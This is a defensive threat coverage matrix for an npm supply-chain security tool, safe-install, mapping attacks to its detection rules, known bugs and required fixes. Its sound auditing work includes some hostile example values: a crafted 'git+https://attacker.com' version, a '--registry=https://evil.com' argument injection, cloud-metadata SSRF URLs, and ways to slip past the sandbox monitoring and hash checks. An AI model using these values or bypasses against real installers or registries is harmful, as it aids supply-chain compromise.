# Threat Coverage Matrix

Assessment of how safe-install mitigates known npm supply chain attack techniques.
Reference: [WTFpkg — npm](https://0xv1n.github.io/WTFpkg/pm/npm/)

Last updated: 2026-04-08

---

## 1. Dependency Confusion

**Severity:** High
**Attack:** Attacker publishes a public package matching the name of a private/internal package. npm resolves the public version, pulling in malicious code.

### Current Coverage: Very Strong

| Mechanism | Status | Details |
|---|---|---|
| Lockfile diffing | Active | Detects any new/changed package — a swapped registry source shows as an update |
| `new-transitive-dep` rule | Active | Warns when new transitive deps appear |
| `maintainer-changed` rule | Active | Flags maintainer differences if the public imposter has different authors |
| `registry-source-changed` rule (BLOCK) | Active | Blocks when a package's `resolved` URL points to a different registry host than the previous version |
| `unexpected-registry` rule (WARN) | Active | Warns when a package resolves outside the registries listed in `config.registries` |
| Lockfile integrity verification | Active | Downloads tarballs and verifies SHA hashes match lockfile — detects lockfile injection where an attacker edits `resolved` URLs or integrity hashes directly |
| Typosquat detection | Active | Catches names similar to popular packages, which overlaps with confusion attacks using near-miss names |
| `scope-changed` rule (BLOCK) | Active | Blocks when an unscoped package appears where a scoped package was previously installed — the signature pattern of a dependency confusion attack |

### How safe-install helps

When an attacker publishes `internal-utils` on the public registry to shadow a private `@company/internal-utils`, safe-install catches this through multiple layers. The `scope-changed` rule directly blocks the most common pattern: an unscoped package appearing where a scoped package was previously installed. The `registry-source-changed` rule fires if the resolved URL switches from a private registry to `registry.npmjs.org`. If the user has configured `registries` in `.safe-install.json`, `unexpected-registry` fires as well. Even without registry configuration, the lockfile diff surfaces the package as changed, `maintainer-changed` flags the different authors, and integrity verification confirms the tarball matches what the lockfile claims.

### Known Bugs Affecting This Threat

- **Same-version republish is invisible** (`src/lockfile/diff.js`): `diffSnapshots` only compares `version` strings. If an attacker replaces a package's tarball at the same version (changing `resolved`/`integrity` in the lockfile), the package is classified as `unchanged` and the entire analysis pipeline is skipped. See Threat #6 for details.
- **SSRF via `resolved` URLs** (`src/lockfile/integrity.js`): The integrity verifier fetches whatever URL is in the `resolved` field without validation. A malicious lockfile PR can trigger requests to internal services. See Threat #7 for details.
- **Failed/404 registry responses not cached** (`src/registry/metadata.js`): Failed fetches are not cached, causing redundant requests. Under rate-limiting (HTTP 429), this creates a retry storm that can delay or break the analysis.

---

## 2. Lifecycle Script Abuse

**Severity:** Critical
**Attack:** Malicious `preinstall`, `install`, or `postinstall` scripts run arbitrary commands during `npm install`.

### Current Coverage: Very Strong

| Mechanism | Status | Details |
|---|---|---|
| `--ignore-scripts` on every install | Active | Core defence — scripts never execute on the host |
| `no-install-scripts` rule (BLOCK) | Active | Flags packages with any lifecycle scripts: `preinstall`, `install`, `postinstall`, `preuninstall`, `uninstall` |
| Script approval workflow | Active | `safe-install approve` adds to allowlist; `safe-install run-scripts <pkg>` records approval and runs `npm rebuild` for reviewed packages |
| Docker sandbox | Active | Flagged packages installed in isolated container with `--network none`, readonly rootfs, strace monitoring, resource limits |
| `sandbox-network-attempt` rule (BLOCK) | Active | Detects network access during sandboxed install |
| `sandbox-unexpected-process` rule (WARN) | Active | Detects child processes outside the allowlist (node, npm, sh, bash, node-gyp, npx, corepack) |
| `sandbox-file-write-outside-modules` rule (BLOCK) | Active | Detects file writes outside `/sandbox/node_modules` and `/sandbox/package` |
| `sandbox-npmrc-write` rule (BLOCK) | Active | Specifically detects attempts to write `.npmrc` during sandboxed install |
| Behaviour diffing | Active | Compares sandbox results against stored profiles from previous versions — flags new network endpoints, new processes, new file writes, and significant install size changes |

### How safe-install helps

This is safe-install's strongest area. The `--ignore-scripts` flag is applied to every `npm install` invocation unconditionally, so malicious lifecycle scripts never execute on the host machine. This alone neutralises the most common npm attack vector.

For packages that legitimately need scripts (native addons, etc.), the tool provides a layered review path. The `no-install-scripts` rule blocks the install and surfaces which scripts exist. The user can then either sandbox the package (Docker with `--network none`, readonly rootfs, strace tracing) to observe what the scripts actually do, or explicitly approve them via `safe-install run-scripts` after manual review. The sandbox traces every syscall — network connections, file writes, process spawns — and the behaviour diffing system compares these against profiles from previous versions to catch trojanised updates that add new network exfiltration or file system access.

The remaining minor gap is that `needsSandbox()` only triggers sandbox analysis for `preinstall`/`install`/`postinstall` scripts. Packages with only `preuninstall`/`uninstall` hooks are flagged by the rule but not sandboxed. This is low-risk since uninstall hooks only run during package removal, not during `npm install`.

### Known Bugs Affecting This Threat

- **Sandbox network isolation is incomplete** (`src/sandbox/docker.js`): `NetworkDisabled: true` is set but `HostConfig.NetworkMode: 'none'` is not. This only prevents the default bridge; containers can still be connected to other Docker networks. CLAUDE.md states `--network none` is non-negotiable, but it is not actually enforced.
- **Strace monitoring has blind spots** (`src/sandbox/monitor.js`): File write detection only matches `openat` with write flags. `rename()`, `symlink()`, `link()`, and `unlink()` syscalls are unmonitored. Strace's default 32-char string truncation also causes long paths to be missed by the regex.
- **Container restart re-runs install scripts** (`src/sandbox/docker.js`): After the install phase, `container.start()` re-executes the original entrypoint (strace + npm install), running scripts a second time. The subsequent `find` command runs as `root`.
- **Package name/version not validated before `npm pack`** (`src/sandbox/docker.js`): The name and version from the lockfile diff are passed directly to `npm pack`. While `execFile` avoids shell injection, npm itself interprets git refs and URLs, so a crafted version like `git+https://attacker.com/repo.git` could fetch from an arbitrary source.
- **`sandbox-unexpected-process` uses exact string matching** (`src/rules/defaults.js`): The allowed process list compares exact command strings. A strace entry with a full path (`/usr/bin/curl`) won't match `curl` in the allowlist, causing false positives. Conversely, a malicious binary named `node` would pass the check.

---

## 3. .npmrc Manipulation

**Severity:** Medium
**Attack:** Attacker with file write access modifies `.npmrc` to change registry URLs, steal auth tokens, or disable security settings.

### Current Coverage: Strong

| Mechanism | Status | Details |
|---|---|---|
| Pre/post-install `.npmrc` integrity check | Active | Hashes project-level and user-level (`~/.npmrc`) files before install, compares afterward. Detects creation, deletion, and modification |
| `.npmrc` tampering evaluation (BLOCK) | Active | Changes are surfaced as BLOCK-severity evaluations in the report with the specific change type and path |
| `sandbox-npmrc-write` rule (BLOCK) | Active | Dedicated sandbox rule that blocks any file write to `.npmrc` paths during sandboxed install |
| `sandbox-file-write-outside-modules` rule (BLOCK) | Active | General sandbox rule catches `.npmrc` writes as part of broader file-write monitoring |
| Behaviour diff file writes | Active | Flags new file write paths compared to previous version's sandbox profile |

### How safe-install helps

safe-install snapshots both the project `.npmrc` and the user's `~/.npmrc` before running `npm install`, then verifies they haven't changed afterward. Since `--ignore-scripts` prevents lifecycle scripts from executing, the main risk is a compromised npm binary or a supply chain attack that modifies npm's own behaviour. The snapshot/verify mechanism catches any tampering regardless of source.

When sandbox mode is enabled, the dedicated `sandbox-npmrc-write` rule provides an additional layer — it detects attempts to write `.npmrc` inside the sandbox environment, catching packages whose install scripts would try to modify npm configuration if they were allowed to run.

The gap is that only project-level and `~/.npmrc` are monitored. The global npmrc (`/usr/local/etc/npmrc` or npm's built-in config path) is not checked. Additionally, the integrity check runs after `npm install --ignore-scripts` completes, so it verifies that npm itself didn't modify the config. If a pre-existing compromised tool in the environment modified `.npmrc` before safe-install runs, that's outside the tool's scope.

### Known Bugs Affecting This Threat

- **Shared `DEFAULT_CONFIG` mutation** (`src/config/loader.js`): The default config object's `allowlist` array is shared by reference. Repeated calls to `addToAllowlist` within the same process mutate the default, accumulating stale entries. A `.safe-install.json` that doesn't exist on disk would inherit allowlist entries from earlier runs in the same process.

---

## 4. npx Remote Execution

**Severity:** High
**Attack:** `npx` downloads and immediately executes packages without explicit installation, bypassing lockfile-based controls.

### Current Coverage: Strong

| Mechanism | Status | Details |
|---|---|---|
| `safe-npx` wrapper | Active | Analyses packages before execution, blocks on BLOCK-severity rules |
| npx allowlist policy | Active | `config.npx.allowlist` for pre-approved packages, `blockUnknown` mode to deny unlisted packages |
| npx execution logging | Active | Every invocation logged with timestamp, package, version, result (blocked/skipped/allowed), violation count |
| Stale audit warnings | Active | Warns when a package hasn't been audited within `staleDays` (default 30) |
| `no-install-scripts` rule | Active | Flags packages with lifecycle scripts before npx executes them |
| `no-repository` rule | Active | Warns on packages with no repository metadata |
| `typosquat-suspect` rule | Active | Levenshtein + delimiter variant detection against popular packages |
| `no-provenance` rule | Active | Flags packages without SLSA provenance attestations |
| `starjacking-suspect` rule | Active | Detects packages claiming popular GitHub repos they don't own |
| `low-download-count` rule | Active | Warns when a newly encountered package has fewer than 100 weekly downloads |
| `dormant-package` rule | Active | Warns when a package had no new versions for over a year before this release |

### How safe-install helps

The `safe-npx` wrapper intercepts `npx` invocations and queries the npm registry before allowing execution. It checks the package against the rules engine and the npx-specific allowlist. If a BLOCK-level rule fires, execution is prevented. The `blockUnknown` config option provides a strict mode where only pre-approved packages can be executed.

The npx path now evaluates 7 rules covering the most relevant attack surfaces for direct execution: lifecycle scripts, missing repository metadata, typosquats, provenance, starjacking, low download counts, and dormant packages. Typosquat detection is especially critical here — a misspelled `npx cerate-react-app` (instead of `create-react-app`) is one of the most common attack vectors.

Every npx invocation is logged to `.safe-install-npx.log`, creating an audit trail. Stale audit warnings alert users when they're re-running a package that hasn't been checked recently.

Note: `safe-npx` passes `--yes` to the underlying npx command, which auto-approves npx's built-in installation prompt. When combined with `--force` or allowlisting, both the tool's analysis and npx's native safety check are bypassed.

### Known Bugs Affecting This Threat

- **`--force` leaves no audit trail differentiation** (`bin/safe-npx.js`): When `--force` is used to bypass analysis, the log entry is identical to an allowlisted package (`skipped: true`). An attacker running `safe-npx --force malicious-pkg` leaves the same log footprint as a legitimately skipped package. The log should record the skip reason.
- **`--yes` auto-confirms even after warnings** (`bin/safe-npx.js`): After analysis completes with WARN-level results (but no blocks), `npx --yes` auto-installs the package without user confirmation. The tool should only auto-confirm clean packages.
- **Missing `process.exit` after `runNpx`** (`bin/safe-npx.js`): The process may hang after completion if open handles (timers, connections from registry calls) prevent the event loop from draining.
- **Scoped popular packages missing from typosquat list** (`src/rules/typosquat.js`): The `POPULAR_PACKAGES` list contains only unscoped names. Typosquats of `@types/node`, `@babel/core`, `@vue/cli`, etc. are not detected. This is a significant gap for npx, where `npx @babel/croe` is a realistic mistype.

---

## 5. Package Hijacking

**Severity:** Critical
**Attack:** Attacker compromises a legitimate maintainer's npm account and publishes trojanised versions of established packages.

### Current Coverage: Very Strong

| Mechanism | Status | Details |
|---|---|---|
| `maintainer-changed` rule (WARN) | Active | Flags when a previous maintainer is removed between versions |
| `maintainer-added` rule (INFO) | Active | Flags when new maintainers appear on a package |
| `rapid-publish` rule (WARN) | Active | Warns when current and previous versions were published within 24 hours |
| `version-gap` rule (WARN) | Active | Warns when major version jumps by more than 2, or minor jumps by more than 20 |
| Lockfile diffing | Active | Any version change is surfaced for review |
| Behaviour diffing | Active | Compares sandbox profiles across versions — detects new network endpoints, processes, file writes, and install size changes (>2x or <0.5x) |
| Sandbox strace analysis | Active | Traces install behaviour for network exfiltration, file writes, process spawning |
| Provenance verification (INFO) | Active | Checks for SLSA provenance attestations via npm's attestation API. Packages without provenance are flagged |
| Starjacking detection (WARN) | Active | Detects packages claiming popular GitHub repositories they don't belong to, by comparing package name against claimed repo owner/name |
| Typosquat detection (WARN) | Active | Levenshtein distance + delimiter variant checks against a list of popular packages. Catches near-miss names used in hijacking campaigns |
| Lockfile integrity verification (BLOCK) | Active | Downloads tarballs and verifies SHA hashes match the lockfile's integrity field. Detects tampered lockfiles or registry-level substitution |
| `low-download-count` rule (WARN) | Active | Warns when a newly added package has fewer than 100 weekly downloads — catches freshly published malicious packages |
| `dormant-package` rule (WARN) | Active | Warns when a package had no new versions for over a year before this release — a signal of account compromise on abandoned packages |

### How safe-install helps

Package hijacking is hard to detect because the package name and version look legitimate — only the content has changed. safe-install addresses this through multiple complementary signals.

The `maintainer-changed` and `maintainer-added` rules catch the most direct indicator: account compromise often shows as maintainer list changes when the attacker adds their own account or the original maintainer's credentials are rotated after the incident. The `rapid-publish` rule catches the common pattern where an attacker pushes multiple trojanised versions in quick succession. The `version-gap` rule flags suspicious jumps like 1.2.3 to 9.0.0 that are characteristic of automated attacks.

The behaviour diffing system is the strongest layer here. Even if the attacker publishes a version that looks normal in metadata, the sandbox will detect new network connections (exfiltration), new file writes (backdoor installation), or new processes (reverse shells). The comparison against the previous version's profile makes it very difficult to slip in malicious behaviour without triggering a rule.

Provenance verification adds a supply-chain authenticity signal — packages built and published through verified CI/CD pipelines (GitHub Actions, etc.) have SLSA attestations that prove the published artifact matches the source code. A hijacker publishing from their own machine won't have these attestations.

The `dormant-package` rule catches a common hijacking pattern: an attacker gains access to an abandoned npm account and publishes a new version after years of inactivity. The `low-download-count` rule complements this by flagging newly added packages with very few downloads, which is typical of freshly published malicious packages that haven't yet gained traction.

### Known Bugs Affecting This Threat

- **Provenance attestation signatures are never verified** (`src/registry/provenance.js`): The provenance check queries the npm attestation API and looks for SLSA predicateTypes, but never verifies the cryptographic DSSE envelope signature. An attacker who controls the registry response (MITM, compromised registry mirror) can inject a fake attestation. `hasProvenance: true` gives a false sense of security.
- **Starjacking regex broken for repos with dots** (`src/rules/starjacking.js`): The `parseGitHubRepo` regex uses `[^/.#]+` for the repo name capture group, which excludes dots. Repos like `vercel/next.js` are parsed as `vercel/next`, which never matches the `POPULAR_REPOS` entry `vercel/next.js`. Starjacking detection silently fails for any repo with a dot in its name.
- **Dormancy check doesn't filter post-current versions** (`src/registry/downloads.js`): `isDormantPackage` compares against the most recently published version, but doesn't filter out versions published *after* the current version. When auditing an older version, the gap calculation can be wrong (negative), causing dormancy to never trigger.
- **`version-gap` breaks on pre-release versions** (`src/rules/defaults.js`): Versions like `1.0.0-beta.1` produce `NaN` from `Number("0-beta")`, silently disabling the version-gap rule for all pre-release versions.

---

## 6. Lockfile Injection (Same-Version Republish)

**Severity:** Critical
**Attack:** Attacker republishes a package at the same version number with different content, or directly edits the lockfile to change `resolved` URLs and `integrity` hashes while keeping version numbers identical.

### Current Coverage: Weak

| Mechanism | Status | Details |
|---|---|---|
| Lockfile diffing | **Broken** | `diffSnapshots` compares only `version` strings. If the version is unchanged but `resolved` or `integrity` changed, the package is classified as `unchanged` and never evaluated |
| Lockfile integrity verification | Partial | Downloads tarballs and verifies hashes, but only for packages in the `added` or `updated` sets — `unchanged` packages are skipped |
| `registry-source-changed` rule | **Not triggered** | Only runs against packages in the diff's changed set |

### How safe-install fails

This is the most critical gap found in the audit. The `diffSnapshots` function (`src/lockfile/diff.js`) classifies packages as unchanged when the version string matches, without comparing `resolved` or `integrity`. An attacker who gains publish access to a package can `npm unpublish` and republish the same version with malicious content. Alternatively, an attacker who can modify the lockfile directly (e.g., via a malicious PR) can change the `resolved` URL to point to a trojanised tarball while keeping the version number identical.

Because the package is classified as `unchanged`, it is excluded from `getChangedPackages`, never passed to the rule engine, and never integrity-checked. The entire analysis pipeline is bypassed.

### Required Fix

`diffSnapshots` must compare `resolved` and `integrity` fields in addition to `version`. If any differ, the package should be classified as `updated` (or a new `modified` category) so it enters the evaluation pipeline.

---

## 7. Server-Side Request Forgery (SSRF) via Lockfile

**Severity:** High
**Attack:** Attacker crafts a lockfile with `resolved` URLs pointing to internal network services. When safe-install verifies integrity, it fetches these URLs from the machine running the tool.

### Current Coverage: None

| Mechanism | Status | Details |
|---|---|---|
| URL validation on `resolved` field | **Missing** | `verifyIntegrity` (`src/lockfile/integrity.js`) passes the `resolved` URL directly to `fetch()` with no validation |
| Registry allowlist check | **Not applied** | The `unexpected-registry` rule checks the `resolved` URL in the rule engine, but integrity verification runs independently and fetches first |

### How safe-install fails

The `verifyIntegrity` function downloads tarballs from whatever URL is in the lockfile's `resolved` field. A malicious lockfile can set `resolved` to `http://169.254.169.254/latest/meta-data/` (AWS metadata), `http://localhost:9200/_cat/indices` (Elasticsearch), or any internal service. The tool issues the request from the host machine, enabling SSRF.

This is especially dangerous because safe-install is designed to process untrusted lockfiles — the lockfile *is* the attack surface. The integrity check will fail (the response won't match the hash), but the HTTP request is already made, which is sufficient for many SSRF attacks (probing, triggering side effects, exfiltrating via DNS).

### Required Fix

Validate `resolved` URLs before fetching: reject non-HTTPS URLs, reject private/reserved IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost, ::1), and optionally restrict to configured registry hostnames.

---

## 8. Sandbox Escape & Monitoring Bypass

**Severity:** Critical
**Attack:** Malicious install scripts evade sandbox monitoring or exploit sandbox misconfiguration to affect the host.

### Current Coverage: Moderate (multiple gaps)

| Mechanism | Status | Details |
|---|---|---|
| Network isolation (`NetworkDisabled`) | **Incomplete** | `NetworkDisabled: true` is set but `HostConfig.NetworkMode: 'none'` is not. `NetworkDisabled` only prevents the default bridge network; the container can still be connected to other Docker networks |
| Strace file-write monitoring | **Bypassable** | Only detects `openat` with write flags. `rename()`, `symlink()`, `link()`, `renameat2()` syscalls are unmonitored — a package can move/link files into sensitive locations undetected |
| Strace output truncation | **Bypassable** | Strace truncates long strings to 32 chars by default. File writes with long paths produce truncated output (e.g., `"/sandbox/node_modules/evil/very-lo"...`) that the regex fails to match, silently missing the detection |
| Process spawn monitoring | **Incomplete** | Only `execve` is matched. `clone()`/`fork()` without `execve` creates invisible child processes |
| Container restart for `find` | **Dangerous** | After the install phase, `container.start()` re-starts the container, re-executing the original `Cmd` (strace + npm install). Install scripts run a second time. The subsequent `find` command runs as `User: 'root'` |
| `SYS_PTRACE` capability | Active risk | Required for strace but allows ptrace attach to other processes in the same PID namespace |
| Path traversal in profile storage | **Exploitable** | `saveProfile` and `loadProfile` use `path.join(profileDir, packageName)` without validating the resolved path stays within the profile directory. Package names containing `../` write profiles to arbitrary locations |

### How safe-install fails

The sandbox has several compounding weaknesses:

**Network isolation is incomplete.** The Docker API equivalent of `--network none` is `HostConfig.NetworkMode: 'none'`, not `NetworkDisabled: true`. The current setting only disconnects the default bridge but doesn't prevent reconnection to other networks. CLAUDE.md states `--network none` is "non-negotiable," but it isn't actually enforced.

**Strace monitoring has blind spots.** The monitor only parses `openat` for file writes, missing `rename`, `symlink`, `link`, and `unlink` syscalls. A malicious script can `rename()` a file from a temporary location into a sensitive path, or create symlinks, without triggering any detection. Additionally, strace's default string truncation (32 chars) causes long file paths to be cut off with `"..."`, which the regex doesn't match.

**The container restart pattern is dangerous.** After the sandboxed install completes, the code calls `container.start()` to run `find` for file enumeration. This re-executes the original entrypoint command, running `npm install` with strace a second time. The `find` itself runs as root, which is unnecessary.

### Required Fixes

1. Add `NetworkMode: 'none'` to `HostConfig` in `docker.js`
2. Add strace `-s 4096` flag to prevent string truncation
3. Add regex patterns for `rename`, `symlink`, `link`, `renameat`, `renameat2`, `unlink`, `unlinkat`
4. Add `clone`/`vfork` to process monitoring
5. Use `container.exec` for `find` instead of restarting the container; run as `sandboxuser` not `root`
6. Validate profile paths: `path.resolve(dir).startsWith(path.resolve(profileDir))`

---

## 9. CLI Argument Injection

**Severity:** High
**Attack:** Attacker tricks a user into running `safe-install install --registry=https://evil.com some-pkg`, or crafts a CI script that passes unsanitised arguments. npm flags pass through to the underlying `npm install` call.

### Current Coverage: None

| Mechanism | Status | Details |
|---|---|---|
| CLI argument validation | **Missing** | `src/index.js` spreads user-provided args directly into the `npm install` command without filtering |
| `npm rebuild` in `run-scripts` | **Missing** | `bin/safe-install.js` passes the user-provided `pkgSpec` to `npm rebuild` without validating it was previously analysed |

### How safe-install fails

The `runInstallAndAnalyse` function accepts `args` from the CLI and passes them directly to `execFile('npm', ['install', '--ignore-scripts', ...args])`. While `execFile` avoids shell injection, npm interprets its own flags. An attacker can pass `--registry=https://evil.com` to redirect package resolution to a malicious registry, completely bypassing registry-source checks (since the lockfile would legitimately reflect the evil registry).

The `run-scripts` command has a separate issue: it runs `npm rebuild <pkgSpec>` for any user-provided package spec without verifying the package was previously analysed or approved. A user (or automated script) can execute `safe-install run-scripts totally-different-pkg@1.0.0` to run install scripts for an unreviewed package.

### Required Fixes

1. Filter `args` to only allow package specifiers (matching `@?[a-z0-9-._~/]+(@[a-zA-Z0-9._-]+)?`); reject anything starting with `-`
2. Validate `run-scripts` targets against the existing allowlist or a recent analysis result

---

## 10. Rule Engine Robustness

**Severity:** Medium
**Attack:** Not a direct attack vector, but weaknesses in the rule engine reduce the effectiveness of all threat detection.

### Current Coverage: Gaps

| Mechanism | Status | Details |
|---|---|---|
| Rule exception handling | **Missing** | If any `rule.check()` throws (e.g., unexpected null metadata), it crashes the evaluation loop for that package. All remaining rules are skipped |
| Severity validation | **Missing** | Config overrides can set `severity` to any string (e.g., `"ignore"`, a typo). Invalid severities silently pass downstream checks like `severity === 'block'`, effectively disabling the rule |
| Bare-name allowlist | Active risk | An allowlist entry of `"lodash"` (no `@version`) matches all versions unconditionally, including future compromised versions. No warning is emitted |
| `sha1` integrity bypass | **Exploitable** | The integrity regex only matches `sha256/384/512`. Packages with `sha1`-only integrity strings silently skip verification with no warning. An attacker can inject `sha1` integrity values to avoid hash checking |
| v1 lockfile silent failure | Active risk | v1 lockfiles (npm < 7) return an empty Map from `parseLockfile`, making all packages appear new or causing empty audit results, with no warning |

### How safe-install is affected

These are force-multiplier issues. A single `rule.check()` exception (from an unexpected registry response shape) can disable all remaining rules for a package, including critical BLOCK-severity rules. Invalid severity overrides can silently downgrade `block` to a no-op. The `sha1` integrity bypass provides a clean path to skip hash verification entirely.

### Required Fixes

1. Wrap `rule.check()` in try/catch; push a warning and continue on error
2. Validate `override.severity` against `['block', 'warn', 'info']`; throw on invalid values
3. Add `sha1` to the integrity regex, or emit a warning when only unsupported algorithms are present
4. Detect v1 lockfiles and throw a descriptive error instead of returning empty

---

## Coverage Summary

| Threat | Coverage | Key Mechanisms |
|---|---|---|
| Dependency Confusion | **Very Strong** | `scope-changed`, `registry-source-changed`, `unexpected-registry`, lockfile diffing, integrity verification, typosquat detection |
| Lifecycle Script Abuse | **Very Strong** | `--ignore-scripts` always, `no-install-scripts` rule, Docker sandbox with strace, behaviour diffing, script approval workflow |
| .npmrc Manipulation | **Strong** | Pre/post-install hash verification, `sandbox-npmrc-write` rule, file-write monitoring |
| npx Remote Execution | **Strong** | `safe-npx` wrapper with 7 rules (typosquat, provenance, starjacking, downloads, dormancy), allowlist + `blockUnknown`, execution logging |
| Package Hijacking | **Very Strong** | Maintainer rules, `rapid-publish`, `version-gap`, `dormant-package`, `low-download-count`, behaviour diffing, provenance, starjacking, integrity verification |
| Lockfile Injection | **Weak** | Diff only compares version strings; same-version republish is invisible to the entire pipeline |
| SSRF via Lockfile | **None** | No URL validation on `resolved` field before fetching tarballs |
| Sandbox Escape / Bypass | **Moderate** | NetworkDisabled ≠ --network none; strace monitoring has blind spots (rename, symlink, truncation); container restart re-runs scripts |
| CLI Argument Injection | **None** | No filtering of CLI args passed to `npm install`; `run-scripts` doesn't verify prior approval |
| Rule Engine Robustness | **Weak** | Unhandled rule exceptions, invalid severity overrides, sha1 integrity bypass, v1 lockfile silent failure |
